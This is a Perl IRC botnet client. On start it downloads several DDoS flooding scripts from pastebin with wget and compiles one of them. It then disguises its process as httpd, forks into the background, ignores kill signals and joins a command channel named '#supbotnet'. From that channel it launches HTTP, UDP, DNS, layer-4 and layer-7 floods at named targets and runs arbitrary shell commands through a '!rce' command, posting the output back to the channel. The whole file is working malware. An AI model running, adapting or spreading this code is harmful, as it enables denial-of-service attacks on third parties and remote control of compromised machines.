#!usr/bin/perl

use IO::Socket;
my $processo = '/usr/sbin/httpd';
my $server  = "irc.st-city.net"; 
my $code = int(rand(1000));
my $channel = "#supbotnet";
my $port    =   "6669";
my $nick    = "Mecz1nho-$code";

unless (-e "cfbypass.py") {
  print "[*] Instalando o CloudFlare Protection Bypass...";
  system("wget https://pastebin.com/raw/VEzAg7k3 -O cfbypass.py");
}

unless (-e "sadattack.py") {
  print "[*] Instalando o SADATTACK...";
  system("wget https://pastebin.com/raw/XiwqFZqe -O sadattack.py");
}

unless (-e "hulk.py") { 
  print "[*] Instalando o HULK... ";
  system("wget https://pastebin.com/raw/gdDMQXWQ -O hulk.py");
}

unless (-e "goldeneye.py") { 
  print "[*] Instalando o Goldeneye... ";
  system("wget https://pastebin.com/raw/eY3C0anh -O goldeneye.py");
}

unless (-e "udp1.pl") { 
  print "[*] Instalando UDPFlooder... ";
  system("wget https://pastebin.com/raw/n399Y8ES -O udp1.pl");
}

unless (-e "std.c") { 
  print "[*] Instalando STD... ";
  system("wget https://pastebin.com/raw/3UCGvEnD -O std.c");
  system("gcc std.c -o std -pthread");
}

unless (-e "httpabuse.pl") { 
  print "[*] Instalando HTTPABUSE... ";
  system("wget https://pastebin.com/raw/nzmmmQaR -O httpabuse.pl");
}

unless (-e "DNS.pl") { 
  print "[*] Instalando DNS... ";
  system("wget https://pastebin.com/raw/ZEeaYZRg -O DNS.pl");
}

all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

print "Online ;)\n\n";
while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";
      }

     if ( $log =~ m/:!cfbypass (.*)$/g ){##########
        my $target_cfpbypass = $1;
        $target_cfpbypass =~ s/^\s*(.*?)\s*$/$1/;
        $target_cfpbypass;
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python cfbypass.py $target_cfpbypass > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!cfpstop/g ){##########
	    print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f cfpbypass");
      }
	 
	 if ( $log =~ m/:!sadattack (.*)$/g ){##########
        my $target_sadattack = $1;
        $target_sadattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_sadattack;
        print $s0ck3t "PRIVMSG $channel :67[63SAD-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python sadattack.py $target_sadattack > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stopsad/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63SAD-HTTP67]61 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f sadattack");
      }

      if ( $log =~ m/:!hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $s0ck3t "PRIVMSG $channel :67[63HULK-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stophulk/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HULK-HTTP67]61 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f hulk");
      }

      if ( $log =~ m/:!gold (.*)$/g ){##########
        my $target_gold = $1;
        $target_gold =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :67[63GOLD-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python goldeneye.py $target_gold -w 15 -s 650 > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopgold/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63GOLD-HTTP67]61 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f goldeneye");
      }

      if ( $log =~ m/:!udp (.*)$/g ){##########
        my $target_udp = $1;
        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl udp1.pl $target_udp > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopudp/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f udp1");
      }

      if ( $log =~ m/:!std (.*)$/g ){##########
        my $target_std = $1;
        my $port_std = $2;
        my $time_std = $3;
        print $s0ck3t "PRIVMSG $channel :67[63STD67]61 Mass DDoS Attack  on target: $1 \r\n";
        system("nohup ./std $target_std $port_std $time_std > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopstd/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63STD67]61 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f std");
      }

    if ( $log =~ m/:!http (.*)$/g ){##########
        my $target_httpabuse = $1;
        $target_httpabuse =~ s/^\s*(.*?)\s*$/$1/;
        $target_httpabuse;
        print $s0ck3t "PRIVMSG $channel :67[63HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl http.pl $target_httpabuse 1000 100 GET 13.37 > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stophttp/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HTTP67]61 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f http");
      }

      if ( $log =~ m/:!dns (.*)$/g ){##########
        my $target_dns = $1;
        my $time_dns = $2;
        print $s0ck3t "PRIVMSG $channel :67[63DNS67]61 *DNS Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl DNS.pl $target_dns $time_dns > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopdns/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63DNS67]61 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f DNS");
      }
	 
	  
	if ( $log =~ m/:!layer4 (.*)$/g ){##########
        my $target_layer4 = $1;
        my $time_layer4 = $2;
        print $s0ck3t "PRIVMSG $channel :*Layer4 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl ufo.pl $target_layer4 $time_layer4 > /dev/null 2>&1 &");
		system("nohup perl ack.pl $target_layer4 $time_layer4 > /dev/null 2>&1 &");
		system("nohup perl rand.pl $target_layer4 $time_layer4 > /dev/null 2>&1 &");
		system("nohup perl udp.pl $target_layer4 > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopl4/g ){##########
        print $s0ck3t "PRIVMSG $channel :*Layer4 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f ufo");
		system("pkill -9 -f ack");
		system("pkill -9 -f rand");
		system("pkill -9 -f udp");
      }
	  
	 if ( $log =~ m/:!layer7 (.*)$/g ){##########
        my $target_layer7 = $1;
        $target_layer7 =~ s/^\s*(.*?)\s*$/$1/;
        $target_layer7;
        print $s0ck3t "PRIVMSG $channel :*Layer7 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl httpabuse.pl $target_layer7 1000 100 GET 13.37 > /dev/null 2>&1 &");
		system("nohup python goldeneye.py $target_layer7 -w 15 -s 650 > /dev/null 2>&1 &");
		system("nohup python sadattack.py $target_layer7 > /dev/null 2>&1 &");
		system("nohup python cfbypass.py $target_layer7 > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stopl7/g ){##########
        print $s0ck3t "PRIVMSG $channel :*Layer7 You have successfully carried out your attack. \r\n";
        system("pkill -9 -f httpabuse");
		system("pkill -9 -f goldeneye");
		system("pkill -9 -f sadattack");
		system("pkill -9 -f cfbypass");
      }
	  
     if ( $log =~ m/:!help/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 Layer4 Methods:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !udp Target / !stopudp\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !std Target Port Time / !stopstd\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !dns Target Time / !stopdns\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !layer4 Target Time / !stopl4 (Em testes e somente para maquinas fortes)\r\n";
        print $s0ck3t "PRIVMSG $channel :67\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 Layer7 Methods:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !hulk http://target.com / !stophulk\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !gold http://target.com / !stopgold\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !http http://target.com / !stophttp\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !sadattack http://target.com / !stopsadattack\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !layer7 http://target.com / !stopl7 (Em testes e somente para maquinas fortes)\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !cfbypass http://target.com / !cfstop\r\n";
      }


      if ( $log =~ m/:!rce (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);
		
        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :67[63RCE67]61 Output67 => $comando_each \r\n";
       }
   }
}
}
while(true){
  all();
}
